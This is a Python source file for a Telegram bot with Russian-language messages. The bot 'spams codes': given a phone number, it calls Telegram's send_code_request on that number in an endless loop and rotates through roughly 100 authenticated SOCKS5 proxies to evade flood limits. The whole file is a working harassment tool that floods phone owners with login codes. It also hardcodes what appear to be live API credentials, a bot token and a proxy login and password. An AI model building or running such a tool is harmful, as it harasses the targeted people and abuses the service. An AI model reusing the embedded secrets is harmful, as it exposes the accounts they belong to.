import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.network.connection import ConnectionTcpAbridged
import socks

API_ID = 35911533
API_HASH = "11dafcdc1514796c867055023716d39a"
BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

proxy_list = [
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.164.209','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'217.181.90.131','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.172.50','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.23.119','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.42.120','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.54.119','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.31.218','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.176.220','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.30.119','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.35.94','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.173.97','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.58.65','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.54.74','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.167.25.6','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.229.129','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.237.153','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.62.233','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.46.223','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.226.78','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.234.175','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.22.141','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.163.159','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.189.248','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.43.242','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.41.255','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.93','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.59.222','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.229','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.191.171','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'217.181.90.19','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.40.106','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.118','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.10.31','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.42.10','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.46.175','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.31.81','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.45.102','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.50.250','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.170.128','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.238.176','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.232.81','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.227','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.29.24','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.51.223','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.231.245','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.239.39','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.195','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.167.25.238','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.85','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.35.231','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.49.95','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.187.109','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.177.96','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.169.14','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.33.77','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.97','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.224.121','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.3.3','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'193.56.28.159','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.40.118','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.181.108','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.27.100','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.247.45','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.168.207','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.52.155','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.171.173','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.36.214','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.4.146','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.52.157','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.25.126','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.62.190','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.242.8','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.46.202','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.38.241','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.235.10','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.9.50','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.8.17','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.190','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.191.241','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.168','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.236.238','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.33.183','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.228','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.112','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.33.183','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.34.191','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.27.165','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.165.75','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.178.227','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'193.56.28.78','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.2','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.7.240','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.43.137','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.39.120','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.252.133','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.48.50','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.38.227','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.20.130','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.177.155','port':3129},
{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.49.223','port':3129}
]

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер телефона в формате +7XXXXXXXXXX или +380XXXXXXXXX для спама кодами.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task, client = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await client.disconnect()
        await update.message.reply_text("Спам остановлен.")
    else:
        await update.message.reply_text("Нет активного спама.")

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идет спам для этого чата.")
        return

    client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
    await client.connect()

    async def spam():
        count = 0
        idx = 0
        while True:
            proxy = proxy_list[idx % len(proxy_list)]
            idx += 1
            proxy_tuple = (socks.SOCKS5, proxy['ip'], proxy['port'], True, proxy['login'], proxy['password'])
            try:
                async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged) as temp_client:
                    await temp_client.connect()
                    await temp_client.send_code_request(phone)
                    count += 1
                    await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone} через {proxy['ip']}")
            except FloodWaitError as e:
                await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {proxy['ip']}, ждём и продолжаем.")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                err = str(e)
                if "all available options" in err or "ResendCodeRequest" in err:
                    await context.bot.send_message(chat_id, f"Все методы на {proxy['ip']}, меняем.")
                else:
                    await context.bot.send_message(chat_id, f"Ошибка на {proxy['ip']}: {err}")
            await asyncio.sleep(0.5)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = (task, client)
    await update.message.reply_text("Запущен спам кодами с ротацией прокси. Для остановки /stop")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.run_polling()

if __name__ == "__main__":
    main()
